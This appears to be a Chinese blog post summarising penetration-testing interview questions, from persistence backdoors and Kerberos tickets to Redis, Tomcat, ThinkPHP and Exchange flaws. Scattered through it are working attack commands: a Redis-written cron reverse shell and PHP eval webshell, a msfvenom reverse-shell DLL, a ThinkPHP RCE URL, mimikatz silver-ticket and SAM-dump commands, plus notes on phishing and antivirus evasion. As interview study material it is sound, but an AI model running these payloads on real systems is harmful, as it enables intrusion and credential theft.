# 渗透测试面试题总结

[t.csdn.cn](http://t.csdn.cn/wBgcv)

## **域**

将网络中多台计算机逻辑上组织到一起，进行集中管理，这种区别于工作组的逻辑环境叫做域，域是组织与存储资源的核心管理单元，在域中，至少有一台域控制器，域控制器中保存着整个域的用户帐号和安全数据库。

**AD域**

AD域可用于同时管理多台电脑，这样实现集中式管理，可以很大程度减少管理员的工作量。比如曾经我们需要在无数客户端上进行多次的设置，在AD域控制器上只需要设置一次就能完成。

1、AD域管理 2、批量管理域用户 3、批量创建域用户 4、批量编辑域用户 5、管理不活跃/禁用的用户帐户 6、AD域密码管理 7、手机App 8、AD域计算机管理 9、终端服务管理

## WAF 绕过

答：

> 1 注释替换空格
> 
> 2 字符集绕过
> 
> 3 chunked绕过
> 
> 4 上传请求 multipart 绕过
> 
> 5.参数污染
> 
> 。。。

## 权限维持

留自启动后门方法很多,大多数都添加到服务,加注册表 加启动项，

**windows：**

> 1.替换系统文件类(shift后门,放大镜后门)
> 
> 2.修改注册表类
> 
> 自启动项、屏幕保护程序注册表、用户登陆初始化、登录脚本、映像劫持、影子账户、AppCertDlls注册表项、AppInit\_DLLs注册表项、文件关联、用户登陆初始化、xx.Netsh Helper DLL
> 
> 3.文件类
> 
> 自启动文件夹、office Word StartUp劫持
> 
> 4.计划任务
> 
> schtasks 、WMI、bitsadmin

**Linux**

> 1.预加载型动态链接库后门
> 
> 2.strace后门
> 
> 3.SSH 后门
> 
> 4.SUID后门
> 
> 5.inetd服务后门
> 
> 6.协议后门
> 
> 7.vim后门
> 
> 8.PAM后门
> 
> 9.进程注入
> 
> 10.Rootkit
> 
> 11.端口复用

**MSF权限维持**

> 1.Persistence模块
> 
> 2.Metsvc 模块

**Powershell权限维持**

**CS权限维持**

> SC命令docker

## dockerl漏洞

虚拟化容器 划分系统

**docker逃逸漏洞**

启动Docker Daemon时，加入-H 0.0.0.0:2375，Docker Daemon就可以接收远端的Docker Client发送的指令。注意，Docker是把2375端口作为非加密端口暴露出来，一般是用在测试环境中。此时，没有任何加密和认证过程，只要知道Docker主机的IP，任何人都可以管理这台主机上的容器和镜像

**防御**

生成CA证书

生成客户端私钥

重启Docker Daemon

**docker远程api漏洞原理**

（1）docker swarm 是一个将docker集群变成单一虚拟的docker host工具，使用标准的Docker API，能够方便docker集群的管理和扩展，该未授权访问,可以通过url操作，执行docker命令。

（2）通过docker client执行目标服务器容器命令，docker是以root权限运行的

一、有运行ssh服务，/root/.ssh目录挂载到container内，，然后修改/.ssh/authorized\_keys 文件，把自己的public key写进去

二、没有运行ssh服务，利用挂载写crontab定时任务，反弹一个shell

## tomcat漏洞

**任意文件读取代码执行**

Tomcat AJP协议由于存在实现缺陷导致相关参数可控，攻击者利用该漏洞可通过构造特定参数，读取服务器webapp下的任意文件。若服务器端同时存在文件上传功能，攻击者可进一步实现远程代码的执行。

**CVE-2017-12615上传webshell，任意命令执行**

CVE-2017-12615漏洞称之为Tomcat PUT方法任意写文件漏洞，类似IIS的PUT上传漏洞。该漏洞可以利用HTTP的PUT方法直接上传webshell到目标服务器，从而获取权限。该漏洞是高危漏洞，在Tomcat的web.xml默认情况下不存在该漏洞，但是一单开发者或者运维人员手动讲web.xml中的readonly设置为false，可以通过 PUT / DELETE 进行文件操控。 该漏洞后续还有一个CVE-2017-12616的漏洞是对CVE-2017-12615的绕过，影响 7.x、8.x、9.x版本。 漏洞的核心错误配置是web.xml中的readonly

**弱口令**

访问[http://127.0.0.1:8080/manager/html](https://link.zhihu.com/?target=http%3A//127.0.0.1%3A8080/manager/html "http://127.0.0.1:8080/manager/html")，打开管理界面，输入用户名密码后即可登录后台，使用【WAR file to deploy】功能上传。上传后访问一句话木马即可

## MSSQL提权

*   **xp\_cmdshell**
    
    查看是否存在 xp\_cmdshell（返回非 0 即存在）
    
    不存在的话可以添加
    
*   **sp\_oacreate** （可瑞）
    
    在xp\_cmdshell被删除或者出错情况下，可以充分利用SP\_OACreate进行提权
    
    sp\_configure的作用是显示或更改当前服务器的全局配置设置，执行成功返回0，失败返回1
    
*   **trigger提权**
    
*   **计划任务提权**
    
*   **差异备份提权**
    
    修改数据库恢复模式为完整模式
    
    创建表并插入数据
    
    进行差异备份将插入的数据备份出来
    
    getshell
    
*   **自启动**
    
*   **沙盒提权**
    
    关闭沙盒，并创建用户xiamo，然后将用户xiamo添加到administrators组中
    
*   **sethc.exe 替换粘滞键提权**
    
    替换c:\\windows\\system32\\下的sethc.exe
    
    替换c:\\windows\\system32\\dllcache\\sethc.exe
    

## weblogic漏洞

是一个基于JAVAEE架构的中间件，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用的Java应用服务器。

*   **XMLDecoder 反序列化漏洞 cve-2017-10271/3506**
    

1.访问`http://your-ip:7001/`即可看到一个404页面，说明weblogic已成功启动。

2.初步判断：访问 [http://your\_ip:7001/wls-wsat/CoordinatorPortType11](http://t.csdn.cn/wls-wsat/CoordinatorPortType11 "http://your_ip:7001/wls-wsat/CoordinatorPortType11")，存在下图则说明可能存在漏洞

3.使用渗透测试工具Railgun，命令执行

weblogic的管理端口是：7001

tomcat端口：8080

jboss端口：8080

端口可以改

未授权登录

任意文件上传

反序列化

## json漏洞

*   **json 劫持漏洞**
    
    json劫持(jsonhijacking)漏洞其实是一个跨域数据窃取漏洞，它通过诱导用户点击恶意文件，重写Array()的构造函数的方法，将敏感的json数据发送攻击者，从而造成敏感信息泄露，所以可以理解为“通过CSRF方式导致的敏感信息泄露”。
    
*   **jsonp注入漏洞**
    
    了解了jsonp的用法，由于callback参数可以自定义，所以就有了所有注入漏洞都有的通病：“输入在输出中回显”，其中导致的一个问题就是XSS，前提是返回包Content-Type:text/html而不是Content-Type: application/json。
    

## fastjson漏洞

（1）Fastjson是Alibaba开发的Java语言编写的高性能JSON库

（2）攻击者准备rmi服务和web服务，将rmi绝对路径注入到lookup方法中，受害者JNDI接口会指向攻击者控制rmi服务器，JNDI接口向攻击者控制web服务器远程加载恶意代码，执行构造函数形成RCE

（3）fastjson漏洞历史

1.fastjson-1.2.24

(fastjson接受的JSON可以通过艾特type字段来指定该JSON应当还原成何种类型的对象，在反序列化的时候方便操作)

2.fastjson-1.248以下

(checkAutoType中使用TypeUtils.getClassFromMapping(typeName)去获取class不为空，从而绕过了黑名单检测)

3.fastjson-1.2.60以下

(在此版本以下，字符串中包含\\x转义字符时可以造成dos漏洞)

## struts2漏洞

答：

> (1)struts是java的web框架
> 
> (2)采取OGNL表达式，处理view层数据字符串到controller层转换成java对象
> 
> (3)重点关注的编号加粗如下

S2-057 影响范围非常小

S2-048 影响范围非常小

**S2-046 和S2-045一样**

**S2-045 影响范围较大—-通过Content-Type这个header头，进而执行命令，通过Strus2对错误消息处理进行回显**

S2-037 影响范围小

S2-032 影响范围小

S2-020 影响范围小

S2-019 影响范围一般

**S2-016 影响范围非常大**

S2-013 S2-016范围内

S2-009 S2-016范围内

S2-005 S2-016范围内

## java反序列化

答：

> （1）Java序列化指Java对象转换为字节序列的过程
> 
> （2）Java反序列化指字节序列恢复为Java对象的过程
> 
> （3） Commons-collections 爆出第一个漏洞开始，Java反序列化漏洞的事件就层出不穷。
> 
> （4）在Java中,利用ObjectInputStream的readObject方法进行对象读取
> 
> （5）可以深入了解 ysoserial有哪些gadgets

## Shiro反序列化

Apache Shiro框架提供了记住我的功能（RememberMe），用户登录成功后会生成经过加密并编码的cookie。cookie的key为RememberMe，。服务端在接收cookie时：

检索RememberMe Cookie的值 Base 64解码 AES解密（加密密钥硬编码） 进行反序列化操作（未过滤处理） 攻击者可以使用Shiro的默认密钥构造恶意序列化对象进行编码来伪造用户的Cookie，服务端反序列化时触发漏洞，从而执行命令。

**cookie有什么特征？**

cookie的值是经过相关信息进行序列化，然后使用AES加密（对称），最后再使用Base64编码处理

**rememberme这个key是怎么检测的？**

检索RememberMe Cookie的值

## redis漏洞

端口号6379

C语言开发

非关系型数据库

关系型数据库 mysql mssql oracle

因配置不当可以未经授权访问，攻击者无需认证就可以访问到内部数据，其漏洞可导致敏感信息泄露（Redis服务器存储一些有趣的session、cookie或商业数据可以通过get枚举键值），也可以恶意执行flushall来清空所有数据，攻击者还可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件。如果Redis以root身份运行，可以给root账户写入SSH公钥文件，直接免密码登录服务器，其相关漏洞信息如下：

**Redis 远程代码执行漏洞(CVE-2016-8339)** Redis 3.2.x < 3.2.4版本存在缓冲区溢出漏洞，可导致任意代码执行。Redis数据结构存储的CONFIG SET命令中client-output-buffer-limit选项处理存在越界写漏洞。构造的CONFIG SET命令可导致越界写，代码执行。

**CVE-2015-8080** Redis 2.8.x在2.8.24以前和3.0.x 在3.0.6以前版本，lua\_struct.c中存在getnum函数整数溢出，允许上下文相关的攻击者许可运行Lua代码（内存损坏和应用程序崩溃）或可能绕过沙盒限制意图通过大量，触发基于栈的缓冲区溢出。

**CVE-2015-4335** Redis 2.8.1之前版本和3.0.2之前3.x版本中存在安全漏洞。远程攻击者可执行eval命令利用该漏洞执行任意Lua字节码

**CVE-2013-7458** 读取“.rediscli\_history”配置文件信息

**ssh公钥**

**通过配置文件写入webshell漏洞**

设置配置文件所在的目录

config set dir /var/www/html

设置要存储的文件名称

config set dbfilename webshell.php

设置字符串类型的变量，其中值为要写入的

set webshell "<?php echo @eval($\_POST\['x'\]); ?>"

保存

save

如果说,我们能够写入到文件中,计划任务里面的内容

反弹shell

然后执行命令:

root@kali:~# redis-cli -h 10.0.0.19

set xx "\\n\* \* \* \* \* bash -i >& /dev/tcp/10.0.0.19/12345 0>&1\\n"

config set dir /var/spool/cron

config set dbfilename root

save

写入ssh文件

ssh-keygen -t rsa

生成一个private\_key public\_key .pub

(echo -e "\\n\\n" | cat xxx.pub | echo -e "\\n\\n") > test.txt 添加回车

传输文件

cat test.txt | redis-cli -x set wahaha 此时就相当于将变量wahaha的值为test.txt里的内容

redis-cli: config set dir /root/.ssh

redis-cli: config set dbfilename authorized\_keys

save

ssh -i ida\_rsa root@ip

## MongoDB

面向文档的开源nosql数据库使用json文档来存储任何数据 ，C++开发

## \--os-shell原理

**Mysql**

必要条件：

*   拥有网站的写入权限
    
*   Secure\_file\_priv参数为空或者为指定路径。
    

普通注入--os-shell主要是通过上传一个sqlmap的马，然后通过马来进行命令执行。

**Sqlserver**

必要条件：

*   数据库支持外连
    
*   数据库权限为SA权限
    

Sqlserver --os-shell主要是利用`xp_cmdshell`扩展进行命令执行。

## nmap脚本参数

\--temper

## Mimikatz

Mimikatz 是一款功能强大的轻量级调试神器，通过它你可以提升进程权限注入进程读取进程内存，当然他最大的亮点就是他可以直接从 lsass.exe 进程中获取当前登录系统用户名的密码

第一步依然是提升权限：privilege::debug 第二步抓取密码：lsadump::lsa /patch

## MSF Metasploit

并不仅仅是一个工具软件，它是为自动化实施经典的、常规的，或复杂新颖的攻击提供基础设施支持的一个完整框架平台。

*   辅助模块（Auxiliaries）
    

扫描，嗅探，指纹识别等相关功能的模块。

*   渗透攻击（Exploit）
    

渗透攻击是指有攻击者或渗透测试者利用一个系统、应用或服务中的安全漏洞，所进行的攻击行为。

*   攻击载荷（Payload）
    

攻击载荷就是我们期望目标系统在本渗透攻击之后去执行的代码，在Metasploit 框架中可以自由地选择、传送和植入。

*   Shellcode
    

Shellcode 是指在渗透攻击时作为攻击载荷(payload)运行的一组机器指令。

*   模块（Module) use
    

一个模块是指Metasploit 框架中所使用的一段软件代码组件。

*   监听器（Listener）
    

监听器是Metasploit 中用来等待连入网络连接的组件。

**操作命令**

*   msf > show exploits
    

这个命令会显示Metasploit 框架中所有可用的攻击模块。

*   msf > show auxiliary
    

这个命令会显示所有辅助模块以及它们的用途。

## cors如何产生

（1）CORS全称是”跨域资源共享”（Cross-origin resource sharing）,Origin源未严格，从而造成跨域问题,允许浏览器向跨源服务器，发出XMLHttpRequest请求

（2）Origin为\*的时候，使用curl测试CORS，

curl <url> -H “Origin: [Evil.Com - We get it...Daily.](https://evil.com/ "Evil.Com - We get it...Daily.")” -I

再寻找的api接口是否有敏感信息泄漏。

## 绕过同源策略

同源：协议相同、域名相同、端口相同，绕过同源策略限制的方法：

> 1、document.domain属性
> 
> 2、片段识别符（URL后加#号）
> 
> 3、window.name
> 
> 4、跨文档通信API
> 
> 5、JSONP
> 
> 6、CORS
> 
> 7、WebSockets

## jsonp跨域

jsonp跨域利用：获取JSON数据并编码发送到远程服务器上

## 逻辑漏洞

相比SQL注入、XSS漏洞等传统安全漏洞，现在的攻击者更倾向于利用业务逻辑层的应用安全问题，这类问题往往危害巨大，并且传统的安全防御设备和措施收效甚微。

逻辑漏洞是指由于程序逻辑不严或逻辑太复杂，导致一些逻辑分支不能够正常处理或处理错误，一般出现在一下几个方面：

*   弱口令
    
*   暴力破解
    
*   验证码安全问题
    
*   接收端前端可控
    
*   重置凭证未校验
    
*   任意用户密码修改
    
*   越权访问
    
*   数据遍历
    
*   订单金额修改
    

## 基线检查

检测本机

rkhunter 阿kei航特er （）

rkhunter -c

生成一个logo日志 cat 他的报告

GScan （windows下)

1.判断版本

2.去网上搜版本漏洞

## cs命令在内存中执行程序

execute 在目标上执行程序(无输出)

**其他命令**

browserpivot 注入受害者浏览器进程 bypassuac 绕过UAC cancel 取消正在进行的下载 cd 切换目录 checkin 强制让被控端回连一次 clear 清除beacon内部的任务队列 connect Connect to a Beacon peerover TCP covertvpn 部署Covert VPN客户端 cp 复制文件 dcsync 从DC中提取密码哈希 desktop 远程VNC dllinject 反射DLL注入进程 dllload 使用LoadLibrary将DLL加载到进程中 download 下载文件 downloads 列出正在进行的文件下载 drives 列出目标盘符 elevate 尝试提权 execute 在目标上执行程序(无输出) execute-assembly 在目标上内存中执行本地.NET程序 exit 退出beacon getprivs Enable system privileges oncurrent token getsystem 尝试获取SYSTEM权限 getuid 获取用户ID hashdump 转储密码哈希值 help 帮助 inject 在特定进程中生成会话 jobkill 杀死一个后台任务 jobs 列出后台任务 kerberos\_ccache\_use 从ccache文件中导入票据应用于此会话 kerberos\_ticket\_purge 清除当前会话的票据 kerberos\_ticket\_use 从ticket文件中导入票据应用于此会话 keylogger 键盘记录 kill 结束进程 link Connect to a Beacon peerover a named pipe logonpasswords 使用mimikatz转储凭据和哈希值 ls 列出文件 make\_token 创建令牌以传递凭据 mimikatz 运行mimikatz mkdir 创建一个目录 mode dns 使用DNS A作为通信通道(仅限DNS beacon) mode dns-txt 使用DNS TXT作为通信通道(仅限D beacon) mode dns6 使用DNS AAAA作为通信通道(仅限DNS beacon) mode http 使用HTTP作为通信通道 mv 移动文件 net net命令 note 备注 portscan 进行端口扫描 powerpick 通过Unmanaged PowerShell执行命令 powershell 通过powershell.exe执行命令 powershell-import 导入powershell脚本 ppid Set parent PID forspawned post-ex jobs ps 显示进程列表 psexec Use a service to spawn asession on a host psexec\_psh Use PowerShell to spawn asession on a host psinject 在特定进程中执行PowerShell命令 pth 使用Mimikatz进行传递哈希 pwd 当前目录位置 reg Query the registry rev2self 恢复原始令牌 rm 删除文件或文件夹 rportfwd 端口转发 run 在目标上执行程序(返回输出) runas 以另一个用户权限执行程序 runasadmin 在高权限下执行程序 runu Execute a program underanother PID screenshot 屏幕截图 setenv 设置环境变量 shell cmd执行命令 shinject 将shellcode注入进程 shspawn 生成进程并将shellcode注入其中 sleep 设置睡眠延迟时间 socks 启动SOCKS4代理 socks stop 停止SOCKS4 spawn Spawn a session spawnas Spawn a session as anotheruser spawnto Set executable tospawn processes into spawnu Spawn a session underanother PID ssh 使用ssh连接远程主机 ssh-key 使用密钥连接远程主机 steal\_token 从进程中窃取令牌 timestomp 将一个文件时间戳应用到另一个文件 unlink Disconnect from parentBeacon upload 上传文件 wdigest 使用mimikatz转储明文凭据 winrm 使用WinRM在主机上生成会话 wmi 使用WMI在主机上生成会话 argue 进程参数欺骗

## 内网域环境的漏洞

密码复用

## 内网渗透（横向渗透）

**1.信息收集**

需要对你的渗透测试环境网络进行配置

**2.探测存活主机**

1）Nmap扫描

发现存在3个存活主机

对这三个主机进行全端口扫描，查看三台主机开放端口情况

2）操作系统识别

通过端口开放情况可判断该主机为Windows操作系统，查看主机操作系统版本

3）收集客户公司信息

企查查，发现客户邮箱

4）漏洞利用

经过前期信息收集，可得出以下判断

10.211.55.5和10.211.55.8均为Windows操作系统。

Windows操作系统开放了

10.211.55.5 PORT STATE SERVICE 135/tcp open msrpc 139/tcp open netbios-ssn 445/tcp open microsoft-ds 5040/tcp open unknown

5）根据开放的445端口可初步确定存在MS17-010永恒之蓝漏洞

对漏洞进行验证和利用，使用Metasploit里对payload进行验证。

经过验证，10.211.55.8存在ms17-010漏洞，使用exploit进行攻击。

msf5 exploit(windows/smb/ms17\_010\_eternalblue) > set rhosts 10.211.55.8 rhosts => 10.211.55.8 msf5 exploit(windows/smb/ms17\_010\_eternalblue) > set rport 445 rport => 445 msf5 exploit(windows/smb/ms17\_010\_eternalblue) > run

6）抓取目标主机的账号登录密码

ipconfig systeminfo

经过对目标主机信息收集，发现目标主机系统为64位，上传64位mimikatz.exe进行密码抓取。

7）前期信息收集发现3389端口没开，无法进行登录操作，使用命令进行3389端口开放操作。

wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1

我们使用Nmap再次进行端口探测，可发现3389端口成功开启。

8）抓取密码

9）CobaltStrike生对生成对木马进行伪装，对客户发送钓鱼邮件诱导点开。

10）最后权限提升

总结：工具扫描端口，已知漏洞利用，上传小马，做免杀，钓鱼

## mimikatz抓到密码解不开hash

**字典破解**

Kali2.0 集成了 John the Ripper

字典文件位于 `/usr/share/john/password.lst`

使用 Kali Linux 上的 John 自带的密码列表。路径为 `/usr/share/john/password.lst`

使用字典破解：

john --wordlist=/usr/share/john/password.lst ./shadow

**暴力破解**

john ./shadow 

列出已破解的明文密码：

john --show ./shadow 

**hashcat**

Kali2.0 集成了 hashcat

字典文件使用 `/usr/share/john/password.lst`

修改 hash 格式：只保留 `$salt$encrypted`

**在线网站**

[HCE分布式计算平台](https://hce.iteknical.com/ "HCE分布式计算平台")

HCE 分布式计算平台, 需要积分才能使用

[md5在线解密破解,md5解密加密](http://www.cmd5.com/ "md5在线解密破解,md5解密加密")

目前暂不支持 SHA-512

**mimipenguin**

下载地址：

[https://github.com/huntergregal/mimipenguin](https://github.com/huntergregal/mimipenguin "https://github.com/huntergregal/mimipenguin")

原理类似于 mimikatz，通过内存导出明文密码

**导出注册表**

reg save hklm\\sam d:\\web\\sam.hive

reg save hklm\\system d:\\web\\system.hive

reg save hklm\\security d:\\web\\security.hive

导出文件成功后可以用cain读取到hash列了。

## 制作白银票据的条件

1.域名称

2.域的SID值

3.域的服务账户的密码HASH

4.伪造的用户名，可以是任意用户名，一般伪造administrator

5.需要访问的服务

**第一步：**

管理员权限运行mimikatz

privilege::debug #提升权限

sekurlsa::logonpasswords #获取service账户hash 和sid(同一个域下得sid一样)

**第二步：**

清空本地票据缓存

kerberos::purge #清理本地票据缓存

kerberos::list #查看本地保存的票据

**第三步：**

伪造白银票据并导入

kerberos::golden /domain:superman.com /sid:S-1-5-21-259090122-541454442-2960687606 /target:win08.superman.com /rc4:f6f19db774c63e49e9af61346adff204 /service:cifs /user:administrator /ptt

**第四步：**

访问域控的共享目录

dir \\win08\\c$

远程登陆，执行命令

PsExec.exe \\win08 cmd.exe

whoami查看权限

## 黄金票据和白银票据

（1）白银票据：抓取到了域控服务hash的情况下，在客户端以一个普通域用户的身份生成TGS票据，并且是针对于某个机器上的某个服务的，生成的白银票据,只能访问指定的target机器中指定的服务。

黄金票据：直接抓取域控中账号的hash，来在client端生成一个TGT票据，那么该票据是针对所有机器的所有服务。

（2）通过mimkatz执行，导出域控中账号的Hash

## php5和php7

preg\_replace()不再支持/e修饰符

create\_function()被废弃

**assert()**默认不在可以执行代码

## 冰蝎的流量分析

payload先base64加密，再经过AES对称加密全部代码，最后传输，经过实际测试，真的开始执行命令了，流量是相当隐蔽

因此解密流量先拿到密钥，接着是AES解密，再接着是base64解密

存在的问题： user-agent老、accept强特征、content-length有规律

## AES解密高低版本区别

AES-GCM可以并行加密解密，AES-CBC的模式决定了它只能串行地进行加密。因为加密是耗时较久的步骤，且加密的方式是相同的，所以并行地实现AES-GCM算法的时候，其效率是高于AES-CBC的；

AES-GCM提供了GMAC信息校验码，用以校验密文的完整性。AES-CBC没有，无法有效地校验密文的完整性；

AES-GCM是流加密的模式，不需要对明文进行填充。AES-CBC是块加密的模式，需要对明文进行填充。(AES-GCM中进行AES加密的是counter，AES-CBC中进行AES加密的是明文块)；

由于AES-CBC中必须要用到padding，导致最后一个明文块与其他密文块不同，因此可能会受到padding Oracle attacks，从而可以直接通过初始向量IV和密码，即可得到明文。

## mssql通过sql注入执行系统命令

XP\_CMDSHELL

SP\_OACREATE

自启动

通过沙盒执行命令提权

## 粘滞键怎么替换的

**sethc.exe替换**(粘滞键)

利用sethc.exe 替换文件提权 **替换c:\\windows\\system32\\下的sethc.exe** declare @o int exec sp\_oacreate 'scripting.filesystemobject', @o out exec sp\_oamethod @o,'copyfile',null, 'c:\\windows\\system32\\cmd.exe','c:\\windows\\system32\\sethc.exe'; **替换c:\\windows\\system32\\dllcache\\sethc.exe** declare @oo int exec sp\_oacreate'scripting.filesystemobject', @oo out exec sp\_oamethod @oo,'copyfile',null,'c:\\windows\\system32\\cmd.exe',' c:\\windows\\system32\\dllcache\\sethc.exe';

## 杀软对抗(做过免杀)

**修改特征码**

免杀的最基本思想就是破坏特征，这个特征有可能是特征码，有可能是行为特征，只要破坏了病毒与木马所固有的特征，并保证其原有功能没有改变，一次免杀就能完成了。

特征码：能识别一个程序是一个病毒的一段不大于64字节的特征串

**花指令免杀**

花指令其实就是一段毫无意义的指令，也可以称之为垃圾指令。花指令是否存在对程序的执行结果没有影响，所以它存在的唯一目的就是阻止反汇编程序，或对反汇编设置障碍。

**加壳免杀**

说起软件加壳，简单地说，软件加壳其实也可以称为软件加密（或软件压缩），只是加密（或压缩）的方式与目的不一样罢了。壳就是软件所增加的保护，并不会破坏里面的程序结构，当我们运行这个加壳的程序时，系统首先会运行程序里的壳，然后由壳将加密的程序逐步还原到内存中，最后运行程序。

当我们运行这个加壳的程序时，系统首先会运行程序的“壳”，然后由壳将加密的程序逐步还原到内存中，最后运行程序。这样一来，在我们看来，似乎加壳之后的程序并没有什么变化，然而它却达到了加密的目的，这就是壳的作用。

## 内网的exchange漏洞

**CVE-2018-8581：任意用户位置漏洞**

该漏洞允许任何经过身份验证的用户冒充 ExchangeServer 上的其他任意用户，可用来盗取exchange的管理员权限。

**CVE-2019-1040：Windows NTLM篡改漏洞**

攻击方式一：攻击域Exchange Server

利用姿势：使用中继的LDAP身份验证，为攻击者帐户授予DCSync权限。攻击者帐户使用DCSync转储AD中的所有密码哈希值。

**CVE-2020-0688：Microsoft Exchage 远程代码执行漏洞**

漏洞描述：当攻击者通过各种手段获得一个可以访问Exchange Control Panel （ECP）组件的用户账号密码，就可以在被攻击的exchange上执行任意代码，直接获取服务器权限。

**CVE-2020-16875：Microsoft Exchage 远程代码执行漏洞**

漏洞描述：远程攻击者通过构造特殊的cmdlet参数，可造成任意命令执行。

**CVE-2020-17144：Microsoft Exchage 远程代码执行漏洞**

漏洞描述：远程攻击者通过构造特殊的cmdlet参数，绕过身份验证利用改漏洞可造成任意远程命令执行。

**CVE-2021-26855：服务端请求伪造漏洞** 攻击者能够发送任意HTTP请求并通过Exchange Server进行身份验证。

**CVE-2021-26857：反序列化漏洞** 攻击者可以在Exchange服务器上以SYSTEM身份运行代码。

**CVE-2021-26858/CVE-2021-27065：任意文件写入漏洞** 攻击者通过Exchange服务器进行身份验证后，可以将文件写入服务器上的任何路径。

## 打印机的漏洞

Microsoft Windows Print Spooler 服务未能限制对RpcAddPrinterDriverEx()函数的访问，该函数可能允许远程身份验证的攻击者以系统权限在易受攻击的系统上执行任意代码。该RpcAddPrinterDriverEx()函数用于在系统上安装打印机驱动程序。此函数的参数之一是DRIVER\_CONTAINER对象，它包含有关添加的打印机将使用哪个驱动程序的信息。另一个参数，dwFileCopyFlags指定如何复制替换打印机驱动程序文件。攻击者可以利用任何经过身份验证的用户都可以调用RpcAddPrinterDriverEx()并指定位于远程服务器上的驱动程序文件这一事实。这会导致 Print Spooler 服务spoolsv.exe以 SYSTEM 权限执行任意 DLL 文件中的代码。

**win11开启这个打印机服务**

**DLL生成** kali到tmp目录生成dll

msfvenom -f dll -p windows/x64/shell\_reverse\_tcp LHOST=192.168.133.145 LPORT=3333 -o reverse.dll

**SMB 配置**

at /etc/samba/smb.conf

\[global\] map to guest = Bad User server role = standalone server usershare allow guests = yes idmap config \* : backend = tdb smb ports = 445

\[smb\] comment = Samba path = /tmp/ guest ok = yes read only = no browsable = yes force user = smbuser

## 无字母webshell

异或的过程就是将字符转化为ascii，再变为二进制进行异或 这里就是将"A"的Ascii码的二进制与"?"的Ascii码的二进制进行异或得到一个新的二进制，在变为Ascii码，最后在变为字符，也就是~

首先我们实现构造assert($_POST\[_\]);

三.变量自增 ‘a’++ => ‘b’，‘b’++ => ‘c’ 根据字母之间的ascii码的关系，知道一个a就可以得到a-z中的所有字符 下面就是考虑如何得到a 数组（Array）的第一个字母就是大写A，而且第4个字母是小写a。也就是说，我们可以同时拿到小写和大写A，等于我们就可以拿到a-z和A-Z的所有字母。 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为Array：

## thinkphp的漏洞

**thinkphp数据库驱动一般用的什么？**

session驱动,Mysql、SqlServer、PgSQL、Sqlite、Oracle、Ibase、Mongo(都支持)

默认的数据库驱动位于`Think\Db\Driver`命名空间下面，驱动类必须继承`Think\Db`类，每个数据库驱动必须要实现的接口方法包括（具体参数可以参考现有的数据库驱动类库）：

**thinkphp支持多sql语句执行吗？**

不支持

**thinkphp5的RCE漏洞了解过吗？**

了解过

**RCE：文件上传**

[http://www.tp5\_0.com/index.php?s=index/](http://t.csdn.cn/index.php?s=index/ "http://www.tp5_0.com/index.php?s=index/")\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=file\_put\_contents&vars1\=./2021\_07\_27.php&vars1\=%3C?php%20eval($\_GET\[1\]);?%3E&XDEBUG\_SESSION\_START=PHPSTORM

s参数中传递的值 被thinkphp5 解析成为module,controller以及方法 s=index/\\think\\app/invokefunction&function=call\_user\_func\_array&vars\[0\]=phpinfo&vars1\=1

模块对应的 index controller \\think\\app action invokefunction

通过ReflectionMethod调用位于\\think\\app类下的invokefunction成员方法. 又发现在\\think\\app类下的Invokefunction成员函数,传递了对应的想要执行的call\_user\_func\_array函数

$args = array( 'call\_user\_func\_array', array('phpinfo', array(1) ));

$function = $args\[0\] $vars = $args\[1\]

return $reflect->invokeArgs($args);

$args = array('phpinfo', array('1'));

call\_user\_func\_array('phpinfo', array('1'))

## 项目或者渗透过程吗

## 给你一个后台登录页面

[www.haha.com](http://t.csdn.cn/www.haha.com "www.haha.com") 旁站 C段 nmap 扫描端口 子目录爆破 逻辑漏洞?

**注册**

form: username password confirm\_password telephone 短信验证码可能直接回显 短信验证码爆破 位数4位最好是纯数字 验证码短时间内不生效 短信爆破 短时间内给特定的一个或者数个用户发送大量的信息 用户名枚举 用户覆盖 $username = xxxx; select \* from xxxx where username = $username insert into insert 相关注入 存储型xss 批量注册 **忘记密码** form: username password confirm\_password telephone 短信验证码可能直接回显 短信验证码爆破 位数4位最好是纯数字 验证码短时间内不生效 短信爆破 短时间内给特定的一个或者数个用户发送大量的信息 用户名枚举 手机,用户名,验证码不一致的问题 点击发送验证码: insert into xxx (telephone, code) values ('xxx', '11111'); 校验: $captcha\_code = select code from xxx where telephone = 'xxxx'; $captcha\_code ?= $\_POST\['code'\]; redirect 修改密码页 **修改密码:**

update xxxx set password = xxxx where telephone = 'xxx' 前端校验,构建回显包绕过 sql注入

**登录页面** 密码不对: 密码错误 用户不存在: 用户不存在 用户名或者密码错误 短信验证码可能直接回显 短信验证码爆破 位数4位最好是纯数字 验证码短时间内不生效 短信爆破 短时间内给特定的一个或者数个用户发送大量的信息 用户名枚举 前端校验,构建回显包绕过 sql注入 万能密码 or '1'='1 验证码 : 验证码不刷新 回显 验证码重复利用 可识别.....

## 过滤了等于号

1、用in()

2、用like

## 过滤了ascii()

hex() bin() ord()

## linux日志文件

/etc/syslog.conf

## ZZCMS

**漏洞1绕过addslashes以及htmlspecialchars**

源码中存在 return addslashes(htmlspecialchars(trim($string)))，对全局的cookie，post以及get请求中的值进行全局的addslashes以及htmlspecialchars处理

绕过关键子 or and select ，因为siteconfig.php文件为框架内部文件必须调用，而且 $\_SERVER\["REQUEST\_URI"\] 是传入的路径，所以加入a=siteconfig.php参数可以绕过

http://www.zzcms.com/?XDEBUG\_SESSION\_START=PHPSTORM&a=siteconfig.php

## TP3

mvc model view controller

model 数据库 view 视图 controller 控制器

http://www.tp3.com/?m=home&c=index&a=test&XDEBUG\_SESSION\_START=PHPSTORM

**thinkphp 2种模式?** 1.普通模式?m=module\_name&c=controller\_name&a=action\_name2.pathinfo/index.php/module\_name/controller\_name/action\_name

**自动加载** spl\_autoload\_register('func\_name')注册一个函数,该函数在需要一个未定义的类是被调用? 1.new class\_name 2.class\_exists

**修改默认进入文件**

C:\\phpStudy\\WWW\\tp3\\ThinkPHP\\Conf\\convention.php

'DEFAULT\_MODULE' => 'Home', // 默认模块 'DEFAULT\_CONTROLLER' => 'Index', // 默认控制器名称 'DEFAULT\_ACTION' => 'test', // 默认操作名称

id\[table\]=users where 1 and updatexml(1,concat(0x7e,user(),0x7e),1)--

id\[table\]=users%20where%201%20and%20updatexml(1,concat(0x7e,user(),0x7e),1)--

**namespace**

